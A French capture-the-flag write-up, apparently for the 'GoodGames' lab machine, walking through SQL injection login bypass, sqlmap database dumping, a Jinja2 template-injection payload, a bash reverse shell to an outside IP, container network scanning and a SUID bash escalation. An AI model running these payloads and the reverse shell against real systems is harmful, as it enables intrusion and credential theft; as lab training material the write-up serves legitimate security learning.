Difficulte : Easy

# Enumeration 
## Nmap
Nous commençons par exécuter une analyse Nmap sur la cible . 

```
80/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.9.2)
|_http-title: GoodGames | Community and Store
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS POST
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
|_http-favicon: Unknown favicon MD5: 61352127DC66484D3736CACCF50E7BEB

```

Le scan Nmap nous montre que seul le port 80 est ouvert et héberge le serveur Python 3.9.2

## Python Webserver
En Navigant sur le port 80 nous trouvons un site web . goodgames.htb/

![[Pasted image 20250417162912.png]] 


```
sudo echo " 10.10.11.130   goodgame.htb" > /etc/hosts 
```

En expectant la fonctionnalité de connexion , Nous essayons une injection SQL , et nous constations que nous devons saisir une adresse email valide .

Saisissons une adresse email valide et allons echanger cet email dans burp suite par celle de l'administrateru admin@goodgames.htb , nous voyons bienvenue 


![[Pasted image 20250417163258.png]]

## SQL injection 
Apres avoir detecter une injection SQL , pour contourner l'authentification nous allons enregistrer la requette dans un fichier goodgame.req 
 Enumerons la base de donnee et les tables pour identifier toutes les informations sensible qui peuvent etre stocke . 
 
```
 sqlmap -r goodgame.reg --dbs
```

Nous découvrons deux bases de données 
information_schema
main 

![[Pasted image 20250417165918.png]]

```
sqlmap -r goodgames.req -D main --tables
```

![[Pasted image 20250417170201.png]]

```
sqlmap -r goodgame.req -D main -T user --dump
```

![[Pasted image 20250417171542.png]]

admin@goodgames.htb :superadministrator

En haut à droite de la page d'administration, il y a une icône d'engrenage supplémentaire. C'est un lien vers `http://internal-administration.goodgames.htb/login`. Je vais l'ajouter à mon profil `/etc/hosts`et visiter la page. C'est un formulaire de connexion

![[Pasted image 20250421135957.png]]

le nom d'utilisateur "admin" et le mot de passe "superadministrator" permettent accéder a la page du dashboard 

![[Pasted image 20250421140123.png]]


# Server-side Template Injection 

je peux essayer une charge utile simple pour voir si je peux obtenir l'exécution du système via ce SSTI :
```
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

![[Pasted image 20250421141229.png]]

nous pouvons alors faire un reverse Shell 

```
{{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >& 
/dev/tcp/10.10.14.6/443 0>&1"').read() }}
```


![[Pasted image 20250421141957.png]]

# Root 
## Enumeration 
 il est clair que nous sommes dans un conteneur docker . je trouve beaucoup de fichier relatif a docker .
 ![[Pasted image 20250421142430.png]]
je vois un utilisateur 1000 , et nous avons pas d'utilisateur 1000 dans le fichier /etc/password 

je suppose que le repertoire est monte dans un conteneur . vérifions
nous avons une adresse ip  


![[Pasted image 20250421142826.png]]

fais un balayage ping 
```
for i in {1..254}; do (ping -c 1 172.19.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
```

```
for port in {1..65535}; do echo > /dev/tcp/172.19.0.1/$port && echo "$port open"; done 2>/dev/null
```


Docker est dans la liste des processus  

![[Pasted image 20250421143838.png]]
bous voyons que augustus a les memes fichiers dans le repertoire du conteneur . 
## shell 
Nous allons copier le fichier /bin/bash dans le repertoire personnel d'augustus 

![[Pasted image 20250421145143.png]]

![[Pasted image 20250421145245.png]]


executions bash avec -p pour que les privileges ne soient pas abandonnes . 

![[Pasted image 20250421145406.png]]
